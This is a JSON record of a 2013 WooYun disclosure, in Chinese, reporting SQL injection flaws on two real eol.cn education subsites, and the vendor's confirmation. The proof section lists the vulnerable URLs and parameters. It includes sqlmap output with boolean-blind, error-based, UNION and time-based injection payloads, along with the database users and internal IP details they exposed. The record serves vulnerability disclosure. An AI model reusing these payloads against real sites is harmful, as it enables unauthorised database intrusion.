{"id": 60246, "wybug_id": "wooyun-2013-044135", "wybug_title": "中国教育在线两分站SQL注入漏洞", "wybug_corp": "eol.cn", "wybug_author": "adm1n", "wybug_date": "2013-11-26 19:35", "wybug_open_date": "2014-01-10 19:36", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-10：\t细节向公众公开  简要描述： 中国教育在线两分站SQL注入漏洞 详细说明：  1.http://liuxuenote.eol.cn/index.php?country_id=42.http://tiaoji.eol.cn/end.php?info_id=223438   漏洞证明：  1.---Place: GETParameter: country_id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: country_id=4 AND 5385=5385---[12:39:06] [INFO] testing MySQL[12:39:06] [INFO] confirming MySQL[12:39:07] [INFO] the back-end DBMS is MySQLweb application technology: Apache, PHP 4.4.8back-end DBMS: MySQL < 5.0.0current user:    'liuxuenote@202.205.109.0/255.255.255.0'available databases [1]:[*] liuxuenote2.---Place: GETParameter: info_id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: info_id=223439 AND 9946=9946    Type: error-based    Title: MySQL >= 4.1 AND error-based - WHERE or HAVING clause    Payload: info_id=223439 AND ROW(4403,6478)>(SELECT COUNT(*),CONCAT(0x7167796671,(SELECT (CASE WHEN (4403=4403) THEN 1 ELSE 0 END)),0x716c6a6271,FLOOR(RAND(0)*2))x FROM (SELECT 5046 UNION SELECT 6648 UNION SELECT 9078 UNION SELECT 2330)a GROUP BY x)    Type: UNION query    Title: MySQL UNION query (NULL) - 26 columns    Payload: info_id=223439 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7167796671,0x536b58684e555a795654,0x716c6a6271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: info_id=223439 AND 4514=BENCHMARK(5000000,MD5(0x6367684a))---[13:07:58] [INFO] the back-end DBMS is MySQLweb application technology: Apache, PHP 4.4.8back-end DBMS: MySQL 4.1current user:    'tiaoji@202.205.109.79'available databases [1]:[*] tiaoji   修复方案：  1.过滤2.通过扫描可以发现这两个网站都在202.205.109.0/255.255.255.0这个网段，并且都开启了SSH 22端口，最好更改一下端口号   版权声明：转载请注明来源 adm1n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2013-11-27 10:51 厂商回复： 感谢测试，我们尽快修正 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}